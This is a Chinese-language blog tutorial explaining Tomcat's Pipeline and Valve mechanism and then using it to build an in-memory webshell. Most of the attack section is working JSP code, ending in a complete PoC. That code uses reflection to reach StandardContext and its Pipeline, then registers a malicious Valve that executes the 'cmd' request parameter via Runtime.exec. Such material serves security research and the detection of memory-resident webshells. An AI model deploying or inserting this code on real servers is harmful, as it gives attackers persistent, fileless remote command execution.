## Valve

### Tomcat管道机制

![image-20240710102242131](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710102242131.png)

Tomcat中定义了两个接口Pipline和valve,valve可以作为pipline的子单位，用于处理传入请求和传出请求

Tomcat的管道机制是指在处理HTTP请求时，将一系列的Valve按顺序链接在一起形成一个处理管道。每个Valve负责在请求处理过程中执行特定的任务，例如认证、日志记录、安全性检查等。这样，请求就会在管道中依次经过每个Valve，每个Valve都可以对请求进行处理或者传递给下一个Valve

Tomcat每个层级的容器（Engine、Host、Context、Wrapper）都有相对应的实现Valve对象（StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve），这些Valve同时维护一个Pipeline实例（StandardPipeline）。在每个层级容器中的管道中都有至少有一个Valve，称之为基础阀，其作用是连接当前容器的下一个容器

#### Valve接口

```java
package org.apache.catalina;

import java.io.IOException;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public interface Valve {
    // 获取下一个阀门
    public Valve getNext();
    // 设置下一个阀门
    public void setNext(Valve valve);
    // 后台执行逻辑，主要在类加载上下文中使用到
    public void backgroundProcess();
    // 执行业务逻辑
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
    // 是否异步执行
    public boolean isAsyncSupported();
}
```

实现类是ValveBase抽象类

#### Pipline接口

![image-20240710104540060](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710104540060.png)

get/set方法用于设置基础阀，通过提供add方法添加阀，remove方法删除阀。StandardPipeline是Tomcat中Pipeline的实现类

### 自定义Valve

通过继承ValveBase抽象类，只需要我们重写invoke方法，实现具体的业务逻辑即可

```java
package org.example.javaweb;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.IOException;


public class Valvetest extends ValveBase {

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        System.out.println("valve test");
        //继续调用下一个valve
        getNext().invoke(request,response);
    }
}
```

### 内存马实现

StandardPipline#addvalve使我们可以向当前管道当中添加valve

![image-20240710142837176](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710142837176.png)

消息传递到connector被解析之后，继续调用最终获取到了StandardPipline对象

具体流程：

1.获取StandardContext对象

2.通过1来获取StandardPipline对象

3.编写恶意valve并加载

+ 1-2

  ```jsp
  <%
      //获取ApplicationContextFaced类
      ServletContext servletContext = request.getSession().getServletContext();
      //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
      Field appContext = servletContext.getClass().getDeclaredField("context");
      appContext.setAccessible(true);
      ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
      //获取StandardContext
      Field stdContext = applicationContext.getClass().getDeclaredField("context");
      stdContext.setAccessible(true);
      StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
      //获取Pipline对象
      Pipeline pipeline =  standardContext.getPipeline();
  %>
  ```

+ 3

  ```jsp
  <%!
      class Shell_valve extends ValveBase{
          @Override
          public void invoke(Request request, Response response){
              String cmd = request.getParameter("cmd");
              try{
                  Runtime.getRuntime().exec(cmd);
              } catch (IOException e) {
                  throw new RuntimeException(e);
              }
          }
      }
  %>
  <%
      Shell_valve shellValve = new Shell_valve();
      pipeline.addValve(shellValve);
  %>
  ```

### 完整POC

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %><%--
  Created by IntelliJ IDEA.
  User: Administrator
  Date: 2024/7/10
  Time: 14:32
  To change this template use File | Settings | File Templates.
--%>


<%
    //获取ApplicationContextFaced类
    ServletContext servletContext = request.getSession().getServletContext();
    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
    Field appContext = servletContext.getClass().getDeclaredField("context");
    appContext.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
    //获取StandardContext
    Field stdContext = applicationContext.getClass().getDeclaredField("context");
    stdContext.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
    //获取Pipline对象
    Pipeline pipeline =  standardContext.getPipeline();
%>
<%!
    class Shell_valve extends ValveBase{
        @Override
        public void invoke(Request request, Response response){
            String cmd = request.getParameter("cmd");
            try{
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
%>
<%
    Shell_valve shellValve = new Shell_valve();
    pipeline.addValve(shellValve);
%>

```

效果如图

![image-20240710144413346](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240710144413346.png)